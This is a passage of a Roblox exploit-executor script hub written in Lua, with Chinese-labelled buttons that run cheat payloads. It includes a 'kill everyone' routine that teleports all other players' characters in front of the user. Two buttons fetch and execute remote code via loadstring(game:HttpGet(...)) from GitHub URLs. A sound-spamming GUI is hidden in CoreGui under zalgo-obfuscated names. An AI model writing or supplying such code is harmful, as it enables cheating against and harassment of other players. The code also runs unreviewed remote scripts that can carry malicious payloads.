hat('VANS_Umbrella','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('MeshPartAccessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),5.23+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Vector Arrow','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),4.15+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('TwitterBird','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),3.08+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Nebula Blade','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2.54+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('bloxcxy','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Slime1Accessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),1.47+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Robloxclassicred','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),0.39+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-47.91+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(51.44+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Root.Velocity.Magnitude > 20 then -- run

elseif Root.Velocity.Magnitude < 20 then -- walk
hat('Nike Shoebox Costume','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('VANS_Umbrella','Right Arm',CFrame.new(0,0,0),CFrame.new(-0.14+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),7.92+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(36.15+0*math["cos"](sine/10))),true)
hat('MeshPartAccessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),5.23+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Vector Arrow','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),4.15+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('TwitterBird','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),3.08+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Nebula Blade','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2.54+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('bloxcxy','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),2+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Slime1Accessory','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),1.47+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
hat('Robloxclassicred','Right Arm',CFrame.new(0,0,0),CFrame.new(0.39+0*math["cos"](sine/10),0.93+0*math["cos"](sine/10),0.39+0*math["cos"](sine/10))*CFrame.Angles(math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10)),math.rad(0+0*math["cos"](sine/10))),true)
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-47.91+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(51.44+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+20*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+-20*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
end

elseif Mode == 'Attack1' then --attack clerp 
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-0.14+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+89.64*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-47.91+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(51.44+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Mode == 'Attack2' then --attack clerp 
NECK.C0=NECK.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RJ.C0=RJ.C0:Lerp(CFrame.new(0+0*math.cos(sine/10),-0.14+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+89.64*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10))),.2) 
RS.C0=RS.C0:Lerp(CFrame.new(1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-47.91+0*math.cos(sine/10))),.2) 
LS.C0=LS.C0:Lerp(CFrame.new(-1.5+0*math.cos(sine/10),0.5+0*math.cos(sine/10),-0.68+0*math.cos(sine/10))*CFrame.Angles(math.rad(89.64+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(51.44+0*math.cos(sine/10))),.2) 
RH.C0=RH.C0:Lerp(CFrame.new(0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(5.58+0*math.cos(sine/10))),.2) 
LH.C0=LH.C0:Lerp(CFrame.new(-0.5+0*math.cos(sine/10),-1+0*math.cos(sine/10),0+0*math.cos(sine/10))*CFrame.Angles(math.rad(0+0*math.cos(sine/10)),math.rad(0+0*math.cos(sine/10)),math.rad(-5.58+0*math.cos(sine/10))),.2)
elseif Mode == 'Attack3' then --attack clerp 

end
srv.RenderStepped:Wait()
end
end)()

  	end    

})

Tab:AddButton({

	Name = "吸人（可攻击）",

	Callback = function()

     -- 你必须有一把剑才能正常发挥.
-- This only works on sword fighting games like Crossroads, Sword Fight on Bridge, and Fencing (如果玩家在黑色垫子上)
-- All you have to do is press the "吸人可攻击" button, and then take out your sword and click to kill everyone, and you're done! :)

-- Objects

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextButton = Instance.new("TextButton")

-- Properties

ScreenGui.Parent = game.CoreGui

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.new(1, 0.388235, 0.368627)
Frame.BorderColor3 = Color3.new(0.67451, 0.211765, 0.152941)
Frame.Position = UDim2.new(0.293040276, 0, 0.491666675, 0)
Frame.Size = UDim2.new(0.106227107, 0, 0.0833333284, 0)
Frame.Active = true
Frame.Draggable = true

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton.BackgroundTransparency = 0.80000001192093
TextButton.Position = UDim2.new(0.103524067, 0, 0.200333327, 0)
TextButton.Size = UDim2.new(0.793684483, 0, 0.601000011, 0)
TextButton.Font = Enum.Font.SourceSansLight
TextButton.FontSize = Enum.FontSize.Size14
TextButton.Text = "杀死所有人"
TextButton.TextScaled = true
TextButton.TextSize = 14
TextButton.TextWrapped = true

run = false
TextButton.MouseButton1Click:connect(function()
run = not run
local function tp()
for i, player in ipairs(game.Players:GetChildren()) do
if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
player.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 1
end
end
end
if run then
while wait() do
if run then
tp()
end
end
end
end)

  	end    

})

Tab:AddButton({

	Name = "车子模型",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/AlexCr4sh/FeScripts/main/FeCarScript.lua", true))()

  	end    

})

Tab:AddButton({

	Name = "电脑键盘",

	Callback = function()

     loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()

  	end    

})

Tab:AddButton({

	Name = "死亡声音",

	Callback = function()

     --sound thingy

--[[
Made By Scripty#2063
If You Gonna showcase this , make sure to Credit me , do not take that you are owner of the script
This Gui is Undetectable
RespectFilteringEnabled must be false to use it
--]]

local ScreenGui = Instance.new("ScreenGui")
local Draggable = Instance.new("Frame")
local Frame = Instance.new("Frame")
local Frame_2 = Instance.new("Frame")
local Time = Instance.new("TextLabel")
local _1E = Instance.new("TextButton")
local UICorner = Instance.new("UICorner")
local _3E = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local SE = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local Path = Instance.new("TextLabel")
local Top = Instance.new("Frame")
local Top_2 = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local TextLabel = Instance.new("TextLabel")
local Exit = Instance.new("TextButton")
local Minizum = Instance.new("TextButton")
local Stop = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local IY = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local Wait = Instance.new("TextBox")

--Properties:

ScreenGui.Name = ". Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ"
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

Draggable.Name = "Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ."
Draggable.Parent = ScreenGui
Draggable.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Draggable.BackgroundTransparency = 1.000
Draggable.BorderSizePixel = 0
Draggable.Position = UDim2.new(0.35026139, 0, 0.296158612, 0)
Draggable.Size = UDim2.new(0, 438, 0, 277)

Frame.Name = ". . Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ. "
Frame.Parent = Draggable
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BackgroundTransparency = 1.000
Frame.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(-0.00133678317, 0, -0.00348037481, 0)
Frame.Size = UDim2.new(0, 438, 0, 277)

Frame_2.Name = " . Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ. "
Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(-0.00133678142, 0, -0.0179207586, 0)
Frame_2.Size = UDim2.new(0, 438, 0, 238)
Frame_2.Active = true
Frame_2.Draggable = true

Time.Name = "Time"
Time.Parent = Frame_2
Time.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Time.BackgroundTransparency = 1.000
Time.Position = UDim2.new(0, 0, 0.0126050422, 0)
Time.Size = UDim2.new(0, 437, 0, 31)
Time.Font = Enum.Font.GothamSemibold
Time.Text = "RespectFilteringEnabled(RFE) : nil"
Time.TextColor3 = Color3.fromRGB(255, 255, 255)
Time.TextScaled = true
Time.TextSize = 14.000
Time.TextWrapped = true

_1E.Name = "1E"
_1E.Parent = Frame_2
_1E.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
_1E.BorderSizePixel = 0
_1E.Position = UDim2.new(0.0182648394, 0, 0.676470578, 0)
_1E.Size = UDim2.new(0, 208, 0, 33)
_1E.Font = Enum.Font.SourceSans
_1E.Text = "Mute Game"
_1E.TextColor3 = Color3.fromRGB(255, 255, 255)
_1E.TextScaled = true
_1E.TextSize = 30.000
_1E.TextWrapped = true

UICorner.Parent = _1E

_3E.Name = "3E"
_3E.Parent = Frame_2
_3E.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
_3E.BorderSizePixel = 0
_3E.Position = UDim2.new(0.0159817357, 0, 0.142857149, 0)
_3E.Size = UDim2.new(0, 209, 0, 33)
_3E.Font = Enum.Font.SourceSans
_3E.Text = "Annoying  Sound"
_3E.TextColor3 = Color3.fromRGB(255, 255, 255)
_3E.TextSize = 30.000
_3E.TextWrapped = true

UICorner_2.Parent = _3E

SE.Name = "SE"
SE.Parent = Frame_2
SE.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
SE.BorderSizePixel = 0
SE.Position = UDim2.new(0.509132445, 0, 0.142857149, 0)
SE.Size = UDim2.new(0, 209, 0, 33)
SE.Font = Enum.Font.SourceSans
SE.Text = "Kill Sound Service"
SE.TextColor3 = Color3.fromRGB(255, 255, 255)
SE.TextSize = 30.000
SE.TextWrapped = true

UICorner_3.Parent = SE

Path.Name = "Path"
Path.Parent = Frame_2
Path.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
Path.BackgroundTransparency = 1.000
Path.Position = UDim2.new(0.00684931502, 0, 0.815126061, 0)
Path.Size = UDim2.new(0, 435, 0, 44)
Path.Font = Enum.Font.GothamSemibold
Path.Text = "Dev Note : This Script is FE and it only FE when RespectFilteringEnabled(RFE) is disabled , elseif RespectFilteringEnabled(RFE) is true then it only be client , mostly RespectFilteringEnabled(RFE) disabled game are classic game"
Path.TextColor3 = Color3.fromRGB(255, 0, 0)
Path.TextScaled = true
Path.TextSize = 14.000
Path.TextWrapped = true

Top.Name = "Top"
Top.Parent = Frame_2
Top.BackgroundColor3 = Color3.fromRGB(41, 60, 157)
Top.BorderColor3 = Color3.fromRGB(27, 42, 53)
Top.BorderSizePixel = 0
Top.Position = UDim2.new(-0.00133678142, 0, -0.128059402, 0)
Top.Size = UDim2.new(0, 438, 0, 30)
Top_2.Name = "Top"
Top_2.Parent = Top
Top_2.BackgroundColor3 = Color3.fromRGB(30, 45, 118)
Top_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
Top_2.BorderSizePixel = 0
Top_2.Position = UDim2.new(0, 0, 0.967638671, 0)
Top_2.Size = UDim2.new(0, 438, 0, 5)

ImageLabel.Parent = Top
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.Position = UDim2.new(0, 0, 0.0666666701, 0)
ImageLabel.Size = UDim2.new(0, 29, 0, 27)
ImageLabel.Image = "http://www.roblox.com/asset/?id=8798286232"

TextLabel.Parent = ImageLabel
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.997245014, 0, 0, 0)
TextLabel.Size = UDim2.new(0, 397, 0, 30)
TextLabel.Font = Enum.Font.GothamSemibold
TextLabel.Text = "FEAG"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextWrapped = true

Exit.Name = "Exit"
Exit.Parent = Top
Exit.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Exit.BackgroundTransparency = 1.000
Exit.Position = UDim2.new(0.924657524, 0, 0, 0)
Exit.Size = UDim2.new(0, 32, 0, 25)
Exit.Font = Enum.Font.GothamSemibold
Exit.Text = "x"
Exit.TextColor3 = Color3.fromRGB(255, 255, 255)
Exit.TextScaled = true
Exit.TextSize = 14.000
Exit.TextWrapped = true

Minizum.Name = "Minizum"
Minizum.Parent = Top
Minizum.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Minizum.BackgroundTransparency = 1.000
Minizum.Position = UDim2.new(0.851598203, 0, 0, 0)
Minizum.Size = UDim2.new(0, 32, 0, 23)
Minizum.Font = Enum.Font.GothamSemibold
Minizum.Text = "_"
Minizum.TextColor3 = Color3.fromRGB(255, 255, 255)
Minizum.TextScaled = true
Minizum.TextSize = 14.000
Minizum.TextWrapped = true

Stop.Name = "Stop"
Stop.Parent = Frame_2
Stop.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Stop.BorderSizePixel = 0
Stop.Position = UDim2.new(0.0182648394, 0, 0.310924381, 0)
Stop.Size = UDim2.new(0, 424, 0, 33)
Stop.Font = Enum.Font.SourceSans
Stop.Text = "Stop"
Stop.TextColor3 = Color3.fromRGB(255, 255, 255)
Stop.TextSize = 30.000
Stop.TextWrapped = true

UICorner_4.Parent = Stop

IY.Name = "IY"
IY.Parent = Frame_2
IY.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
IY.BorderSizePixel = 0
IY.Position = UDim2.new(0.509132445, 0, 0.676470578, 0)
IY.Size = UDim2.new(0, 209, 0, 33)
IY.Font = Enum.Font.SourceSans
IY.Text = "Unmute Game"
IY.TextColor3 = Color3.fromRGB(255, 255, 255)
IY.TextScaled = true
IY.TextSize = 30.000
IY.TextWrapped = true

UICorner_5.Parent = IY

TextLabel_2.Parent = Frame_2
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.0182648394, 0, 0.466386557, 0)
TextLabel_2.Size = UDim2.new(0, 426, 0, 50)
TextLabel_2.Font = Enum.Font.GothamSemibold
TextLabel_2.Text = "Wait Speed       :"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 30.000
TextLabel_2.TextWrapped = true
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left

Wait.Name = "Wait()"
Wait.Parent = Frame_2
Wait.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Wait.BackgroundTransparency = 1.000
Wait.Position = UDim2.new(0.531963468, 0, 0.466386557, 0)
Wait.Size = UDim2.new(0, 199, 0, 50)
Wait.ZIndex = 99999
Wait.ClearTextOnFocus = false
Wait.Font = Enum.Font.GothamSemibold
Wait.Text = "0.5"
Wait.TextColor3 = Color3.fromRGB(255, 255, 255)
Wait.TextSize = 30.000
Wait.TextWrapped = true

--Sound Service:
local notification = Instance.new("Sound")
notification.Parent = game:GetService("SoundService")
notification.SoundId = "rbxassetid://9086208751"
notification.Volume = 5
notification.Name = ". Ǥ҉̷҉̵҉̸҉̷҉̵҉̸҉̡҉̡҉̼҉̱҉͎҉͎҉̞҉̼҉̱҉͎҉͎҉̞҉ͤ҉ͬ҉̅҉ͤ҉ͬ"

--funuction:
Exit.MouseButton1Click:Connect(function()
	ScreenGui:Destroy()
end)
local Mute = false
IY.MouseButton1Click:Connect(function()
	Mute = false
end)

_1E.MouseButton1Click:Connect(function()
	Mute = true
	while Mute == true do 
		wait()
		for _, sound in next, workspace:GetDescendants() do
			if sound:IsA("Sound") then
				sound:Stop()
			end
		end
	end
end)

_3E.MouseButton1Click:Connect(function()
	for _, sound in next, workspace:GetDescendants() do
		if sound:IsA("Sound") then
			sound:Play()
		end
	end
end)

local Active = true
SE.MouseButton1Click:Connect(function()
	Active = true
	while Active == true do
		local StringValue = Wait.Text
		wait(StringValue)
		for _, sound in next, workspace:GetDescendants() do
			if sound:IsA("Sound") then
				sound:Play()
			end
		end
	end
end)

Stop.MouseButton1Click:Connect(function()
	Active = false
end)
--Credit:
notification:Play()
game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "FEAG";
	Text = "FEAG Has Been Loaded , Made By Scripty#2063 (gamer14_123)";
	Icon = "";
	Duration = 10; 
	Button1 = "Yes Sir";
})
--Check:
while true do
	wait(0.5)
	local setting = game:GetService("SoundService").RespectFilteringEnabled
	if setting == true then
		Time.TextColor = BrickColor.new(255,0,0)
		Time.Text ="RespectFilteringEnabled(RFE) : true"
	elseif setting == false then
		Time.Text ="RespectFilteringEnabled(RFE) : false"
		Time.TextColor = BrickColor.new(0,255,0)
	end
end

  	end    

})

Tab:AddButton({

	Name = "物品漂浮（J飘/K回来）",

	Callback = function()

     local options = {
	CaptureAtMagnitude = 5,
    	EquipToolOnCapture = true,
    	ToolFloatBackSpeed = 500,
    	ToolFloatBackResponsiveness = 20,
    
    	HotKeys = {
		Release = Enum.KeyCode.J,
        	Capture = Enum.KeyCode.K
	}
}



local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")


local PLAYER = Players.LocalPlayer
local CHARACTER = PLAYER.Character or PLAYER.CharacterAdded:Wait()
local BACKPACK = PLAYER.Backpack
local HUMANOID_ROOT_PART = CHARACTER:WaitForChild("HumanoidRootPart")


local vA = {}



local function FolderToolParts(pA)
	local tvA = Instance.new("Folder")
    	tvA.Parent = pA

    	for lvA, lvB in next, pA:GetChildren() do
        	if lvB:IsA("BasePart") then
            		lvB.Parent = tvA
        	end
    	end
	
	return tvA
end

local function FindFirstTool()
	for lvA, lvB in next, CHARACTER:GetDescendants() do
        	if lvB:IsA("Tool") and lvB:FindFirstChildOfClass("Part") then
            		return lvB
        	end
	end
	
	for lvA, lvB in next, BACKPACK:GetDescendants() do
        	if lvB:IsA("Tool") and lvB:FindFirstChildOfClass("Part") then
            		return lvB
        	end
    	end


    	return nil
end

local function Release(pA)
	local tvA = FolderToolParts(pA)


    	if #tvA:GetChildren() > 0 then
        	for lvA, lvB in next, tvA:GetDescendants() do
            		if lvB:IsA("BasePart") then
                		lvB.CanCollide = true

                		local tvB = Instance.new("BodyForce")
                		tvB.Force = Vector3.new(0, lvB:GetMass() * workspace.Gravity, 0)
                		tvB.Parent = lvB
            		end
        	end

        	tvA.Parent = workspace
		
        	table.insert(vA, {tvA, pA})
	end
end

local function Capture(pA)
	if pA and pA[1] and pA[2] then
        	local tvA = pA[1]:GetChildren()


        	for lvA, lvB in next, tvA do
			lvB.CanCollide = false
        	end


        	local tvB = Instance.new("Attachment")
        	tvB.Parent = tvA[1]


        	local tvC = Instance.new("Attachment")
        	tvC.Position = Vector3.new(0, 0, -4)
        	tvC.Parent = HUMANOID_ROOT_PART


        	local tvD = Instance.new("AlignPosition")
        	tvD.RigidityEnabled = false
        	tvD.Responsiveness = options.ToolFloatBackResponsiveness
        	tvD.MaxVelocity = options.ToolFloatBackSpeed
        	tvD.MaxForce = options.ToolFloatBackSpeed

        	tvD.Attachment0 = tvB
        	tvD.Attachment1 = tvC
        	tvD.Parent = tvA[1]


        	repeat
			wait()
		until (tvA[1].Position - HUMANOID_ROOT_PART.Position).Magnitude < options.CaptureAtMagnitude


